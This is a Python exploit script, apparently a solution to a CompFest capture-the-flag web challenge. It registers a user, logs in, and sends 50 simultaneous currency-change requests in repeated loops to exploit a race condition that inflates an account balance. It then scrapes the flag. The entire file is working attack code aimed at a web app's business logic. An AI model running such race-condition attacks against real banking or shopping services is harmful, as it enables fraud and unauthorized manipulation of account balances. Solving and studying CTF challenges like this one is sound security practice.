import requests
import threading
import re
from bs4 import BeautifulSoup
import time

# --- Configuration ---
# Change this to the target URL provided by the challenge
BASE_URL = "http://ctf.compfest.id:7303/" 
# You can use any username/password
USERNAME = f"winner-{int(time.time())}"
PASSWORD = "password123"
# Number of concurrent requests to send for the race condition
NUM_THREADS = 50 
# How many times to repeat the race/reset cycle. 3 is usually enough.
RACE_LOOPS = 3

# We pick the currency with the lowest rate to be our divisor
# and the highest rate to be our multiplier to maximize the gain.
LOW_RATE_CURRENCY = "GBP"  # Rate: 0.48
HIGH_RATE_CURRENCY = "IDR" # Rate: 10597.38
# --- End Configuration ---

def exploit():
    """
    Executes the race condition exploit to become super rich and get the flag.
    """
    # A requests.Session object is used to persist cookies across requests
    session = requests.Session()

    print(f"[*] Using username: {USERNAME}")

    # Step 1: Register a new user
    print("[+] Step 1: Registering user...")
    register_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "confirm_password": PASSWORD
    }
    try:
        r = session.post(f"{BASE_URL}/register", data=register_data, timeout=5)
        if "USERNAME ALREADY EXISTS" in r.text:
            print("[!] User already exists. This might happen if you run the script twice quickly. Continuing with login.")
        elif r.status_code == 200 and "login" in r.url:
            print("[+] Registration successful.")
        else:
            print(f"[-] Registration failed with status {r.status_code}. Exiting.")
            return
    except requests.exceptions.RequestException as e:
        print(f"[-] Network error during registration: {e}")
        return

    # Step 2: Login to establish the session
    print("[+] Step 2: Logging in...")
    login_data = {"username": USERNAME, "password": PASSWORD}
    try:
        r = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False, timeout=5)
        # A successful login should result in a redirect (302) to the home page
        if r.status_code != 302 or not r.headers.get("Location"):
            print(f"[-] Login failed. Status: {r.status_code}. Exiting.")
            return
        print("[+] Login successful.")
        # Follow the redirect
        session.get(f"{BASE_URL}{r.headers['Location']}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Network error during login: {e}")
        return

    # Step 3: Set the currency to the one with the lowest rate to prime the attack
    print(f"[+] Step 3: Setting currency to {LOW_RATE_CURRENCY}...")
    try:
        r = session.post(f"{BASE_URL}/change-currency", data={"currency": LOW_RATE_CURRENCY}, timeout=5)
        if r.status_code != 200:
            print("[-] Failed to set initial currency. Exiting.")
            return
        print(f"[+] Currency set to {LOW_RATE_CURRENCY}.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Network error during currency priming: {e}")
        return

    # Step 4: Perform the race/reset loop to amplify the balance
    for i in range(RACE_LOOPS):
        print(f"\n--- Starting Race Loop {i+1}/{RACE_LOOPS} ---")

        # a. The Race
        print(f"[*] Racing {NUM_THREADS} threads to change currency to {HIGH_RATE_CURRENCY}...")
        
        def race_worker():
            """The function each thread will execute."""
            try:
                session.post(f"{BASE_URL}/change-currency", data={"currency": HIGH_RATE_CURRENCY}, timeout=5)
            except requests.exceptions.RequestException:
                # It's common for some requests to fail during a race, we can ignore them
                pass

        threads = [threading.Thread(target=race_worker) for _ in range(NUM_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        print("[*] Race finished.")

        # Optional: Check balance for debugging purposes
        try:
            r = session.get(f"{BASE_URL}/are-you-rich", timeout=5)
            soup = BeautifulSoup(r.text, 'html.parser')
            balance_text = soup.find(string=re.compile(r"Your current balance in AUD is:"))
            if balance_text and balance_text.next_sibling:
                print(f"[DEBUG] Balance (AUD) after race {i+1}: {balance_text.next_sibling.strip()}")
        except requests.exceptions.RequestException:
            print("[DEBUG] Could not fetch balance for debugging.")
        
        # b. The Reset (don't reset on the last loop)
        if i < RACE_LOOPS - 1:
            print(f"[*] Resetting currency back to {LOW_RATE_CURRENCY} for the next loop...")
            try:
                session.post(f"{BASE_URL}/change-currency", data={"currency": LOW_RATE_CURRENCY}, timeout=5)
                print("[*] Currency reset.")
            except requests.exceptions.RequestException as e:
                print(f"[-] Network error during currency reset: {e}")


    # Step 5: Go to the final page and claim the flag
    print("\n[+] Step 5: Checking if we are rich enough...")
    try:
        r = session.get(f"{BASE_URL}/are-you-rich", timeout=5)
        
        # Use regex to find the flag pattern
        if flag_match := re.search(r"FAKE{[^}]+}", r.text):
            print("\n" + "="*40)
            print(f"  [SUCCESS] Flag found: {flag_match.group(0)}")
            print("="*40)
        elif "YES YOU ARE!" in r.text:
            print("\n[SUCCESS] You are rich! Could not parse the flag with regex, printing the message:")
            soup = BeautifulSoup(r.text, 'html.parser')
            message = soup.find('h1', {'class': 'message'})
            print(message.text.strip() if message else "Message not found.")
        else:
            print("\n[-] Exploit failed. You are not rich enough.")
            soup = BeautifulSoup(r.text, 'html.parser')
            message = soup.find('h1', {'class': 'message'})
            print(f"[-] Final message: {message.text.strip() if message else 'Unknown'}")

    except requests.exceptions.RequestException as e:
        print(f"[-] Network error while getting the flag: {e}")


if __name__ == "__main__":
    exploit()
